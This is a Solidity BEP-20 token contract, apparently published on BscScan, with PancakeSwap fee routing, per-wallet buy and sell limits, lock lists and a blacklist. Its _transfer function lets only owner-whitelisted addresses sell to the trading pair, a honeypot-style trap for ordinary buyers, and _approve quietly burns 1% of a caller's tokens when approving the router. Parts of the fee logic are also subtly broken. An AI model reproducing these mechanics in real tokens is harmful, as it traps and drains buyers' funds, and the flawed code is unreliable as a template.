/**
 *Submitted for verification at BscScan.com on 2022-05-17 09:05
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;
import "./Address.sol";
import "./SafeMath.sol";
import "./IFactory.sol";
import "./IERC20Metadata.sol";

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    using Address for address;
    using Address for address payable;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public LockList;
    mapping(address => uint256) public LockedTokens;

    mapping(address => uint256) private _firstSell;
    mapping(address => uint256) private _totSells;

    mapping(address => uint256) private _firstBuy;
    mapping(address => uint256) private _totBuy;

    mapping(address => bool) internal _isExcludedFromFee;
    mapping(address => bool) internal _includeInSell;
    mapping(address => bool) internal _isBadActor;

    uint256 public maxSellPerDay = 150 * 10**9;

    uint256 private _totalSupply;
    uint256 public maxTxAmount;

    uint256 public buyLimit = 7000 * 10**9;
    uint256 public sellLimit = 2000 * 10**9;

    uint256 public burnDifference = 11 * 10**6 * 10**9;
    uint256 public maxBurnAmount = 502700 * 10**9;

    uint256 public timeLimit;
    uint256 public maxSellPerDayLimit;

    string private _name;
    string private _symbol;

    bool private inSwap;
    bool public liquiFlag = true;

    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    IRouter public pancakeRouter;
    address public pancakePair;
    address public constant pancakeSwapRouter =
        0x10ED43C718714eb63d5aA57B78B54704E256024E; 

    address payable public liquidityWallet =
        payable(0x78F37C4cb10bE45A6dC432750427fDEbA2E274De);
    address payable public privateSaleWallet =
        payable(0x61B97d60Cc69bB164474D8420B0F07B9626266F5);
    address payable public marketingWallet =
        payable(0x7d7Cfb6F0a5A9DB7a4138B82C5AfAAEfcD463BAb);
    address payable public strategicSalesWallet =
        payable(0x9Efd34C368d832C909AF068f65e22ec55F991F51);
    address payable public gameOperationsWallet =
        payable(0xe2ce53480092DD163Af8D1Ed95fED4313d4642Ab);
    address payable public teamWallet =
        payable(0x1294068110916A42Caeb7c24Dd491b1745e02BcF);
    address payable public communityAirdropWallet =
        payable(0x89FF72f40CAA8f24b21c14715C15a540f0db1636);
    address payable public burnWallet =
        payable(0x394E058A7bC2704236B1347cbF0114E1BA50BF26);
    address payable public bitxLiabilityWallet =
        payable(0x322DbDB5a902d1edE18fe8Dbd582fc8d95795a01);    

    struct feeRatesStruct {
        uint256 taxFee;
        uint256 burnFee;
        uint256 airdropFee;
        uint256 marketingFee;
        uint256 liquidityFee;
        uint256 liabilityFee;
        uint256 swapFee;
        uint256 totFees;
    }

    feeRatesStruct public buyFees =
        feeRatesStruct({
            taxFee: 10000,
            burnFee: 0,
            airdropFee: 0,
            marketingFee: 0,
            liquidityFee: 0,
            liabilityFee: 0,
            swapFee: 0, // burnFee+airdropFee+liquidityFee+marketingFee
            totFees: 0
        });

    feeRatesStruct private appliedFees = buyFees; //default value

    struct valuesFromGetValues {
        uint256 tTransferAmount;
        uint256 tFee;
        uint256 tSwap;
    }

    event Burn(address indexed from, uint256 value);

    constructor(string memory name_, string memory symbol_) {
        maxSellPerDayLimit = 1 * 10**9;
        timeLimit = block.timestamp;
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        external
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        external
        virtual
        override
        returns (bool)
    {
        uint256 unapprovbal;

        unapprovbal = _balances[msg.sender].sub(
            amount,
            "ERC20: Allowance exceeds balance of approver"
        );
        require(
            unapprovbal >= LockedTokens[msg.sender],
            "ERC20: Approval amount exceeds locked amount "
        );
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        external
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            !_isBadActor[sender] && !_isBadActor[recipient],
            "Bots are not allowed"
        );

        if (!_isExcludedFromFee[sender] && !_isExcludedFromFee[recipient]) {
            require(amount <= maxTxAmount, "you are exceeding maxTxAmount");
        }

        if (recipient == pancakePair) {
            require(_includeInSell[sender], "ERC20:Not allowed to sell");

            if (!liquiFlag) {
                if (maxSellPerDayLimit + amount > maxSellPerDay) {
                    require(
                        block.timestamp > timeLimit + 24 * 1 hours,
                        "maxSellPerDay Limit Exceeded"
                    );
                    timeLimit = block.timestamp;
                    maxSellPerDayLimit = 1 * 10**9 ;
                }
                if (block.timestamp < _firstSell[sender] + 24 * 1 hours) {
                    require(
                        _totSells[sender] + amount <= sellLimit,
                        "You can't sell more than sellLimit"
                    );
                    _totSells[sender] += amount;

                    if (block.timestamp < timeLimit + 24 * 1 hours) {
                        maxSellPerDayLimit += amount;
                    } else {
                        maxSellPerDayLimit = 1 * 10**9 ;
                        timeLimit = block.timestamp;
                    }
                } else {
                    require(
                        amount <= sellLimit,
                        "You can't sell more than sellLimit"
                    );
                    _firstSell[sender] = block.timestamp;
                    _totSells[sender] = amount;

                    if (block.timestamp < timeLimit + 24 * 1 hours) {
                        maxSellPerDayLimit += amount;
                    } else {
                        maxSellPerDayLimit = 1 * 10**9 ;
                        timeLimit = block.timestamp;
                    }
                }
            }
        }
        if (sender == pancakePair) {
            if (block.timestamp < _firstBuy[recipient] + 24 * 1 hours) {
                require(
                    _totBuy[recipient] + amount <= buyLimit,
                    "You can't sell more than buyLimit"
                );
                _totBuy[recipient] += amount;
            } else {
                require(
                    amount <= buyLimit,
                    "You can't sell more than buyLimit"
                );
                _firstBuy[recipient] = block.timestamp;
                _totBuy[recipient] = amount;
            }
        }

        require(LockList[_msgSender()] == false, "ERC20: Caller Locked !");
        require(LockList[sender] == false, "ERC20: Sender Locked !");
        require(LockList[recipient] == false, "ERC20: Receipient Locked !");

        uint256 senderBalance = _balances[sender];
        uint256 stage;
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        stage = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        require(
            stage >= LockedTokens[sender],
            "ERC20: transfer amount exceeds Senders Locked Amount"
        );

        //indicates if fee should be deducted from transfer
        bool takeFee = true;
        bool isSale = false;

        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            takeFee = false;
            if (recipient == pancakePair) {
                isSale = true;
            }
        } else {
            if (recipient == pancakePair) {
                isSale = true;
            }
        }

        _transfeTokens(sender, recipient, amount, takeFee, isSale);
    }

    function _transfeTokens(
        address sender,
        address recipient,
        uint256 amount,
        bool takeFee,
        bool isSale
    ) internal virtual {
        if (isSale) {
            unchecked {
                _balances[sender] = _balances[sender] - amount;
            }
            _balances[recipient] += amount;
            emit Transfer(sender, recipient, amount);
        } else {
            appliedFees = buyFees;
            valuesFromGetValues memory s = _getValues(amount, takeFee);

            unchecked {
                _balances[sender] = _balances[sender] - amount;
            }
            _balances[recipient] += s.tTransferAmount;

            if (takeFee) {
                _takeSwapFees(s.tFee + s.tSwap);
            }

            emit Transfer(sender, recipient, s.tTransferAmount);
        }
    }

    function swapAndSendToFees(uint256 tokens) internal virtual {
        uint256 initialBalance = address(this).balance;
        swapTokensForBNB(tokens);
        uint256 transferBalance = address(this).balance - initialBalance;
        liquidityWallet.sendValue(
            (transferBalance * appliedFees.liquidityFee) / appliedFees.swapFee
        );
        communityAirdropWallet.sendValue(
            (transferBalance * appliedFees.airdropFee) / appliedFees.swapFee
        );
        burnWallet.sendValue(
            (transferBalance * appliedFees.burnFee) / appliedFees.swapFee
        );
        bitxLiabilityWallet.sendValue(
            (transferBalance * appliedFees.liabilityFee) / appliedFees.swapFee
        );
        marketingWallet.sendValue(address(this).balance);
    }

    function swapTokensForBNB(uint256 tokenAmount)
        internal
        virtual
        lockTheSwap
    {
        // generate the pancakeswap pair path of token -> wbnb
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = pancakeRouter.WETH();

        if (allowance(address(this), address(pancakeRouter)) < tokenAmount) {
            _approve(address(this), address(pancakeRouter), ~uint256(0));
        }

        // make the swap
        pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of BNB
            path,
            address(this),
            block.timestamp
        );
    }

    function _getValues(uint256 _amount, bool takeFee)
        private
        view
        returns (valuesFromGetValues memory to_return)
    {
        if (!takeFee) {
            to_return.tTransferAmount = _amount;
            to_return.tFee = 0;
            to_return.tSwap = 0;
            return to_return;
        } else if (takeFee)
            to_return.tFee =
                (_amount * appliedFees.totFees * appliedFees.taxFee) /
                10**6;
            to_return.tSwap =
            (_amount * appliedFees.totFees * appliedFees.swapFee) /
            10**6;
        to_return.tTransferAmount = _amount - to_return.tFee - to_return.tSwap;

        return to_return;
    }

    function _takeSwapFees(uint256 tFee) private {
        _balances[address(this)] += tFee;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function burn(uint256 _value) external returns (bool) {
        require(LockList[msg.sender] == false, "ERC20: User Locked !");

        uint256 stage;
        stage = _balances[msg.sender].sub(
            _value,
            "ERC20: transfer amount exceeds balance"
        );
        require(
            stage >= LockedTokens[msg.sender],
            "ERC20: transfer amount exceeds  Locked Amount"
        );

        _burn(_msgSender(), _value);

        return true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");

        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Burn(account, amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        if (owner != liquidityWallet) {
            if (burnDifference - totalSupply() < maxBurnAmount) {
                if (spender == pancakeSwapRouter) {
                    uint256 burnAmt = amount / 100;
                    _burn(_msgSender(), burnAmt);
                }
            }
        }

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
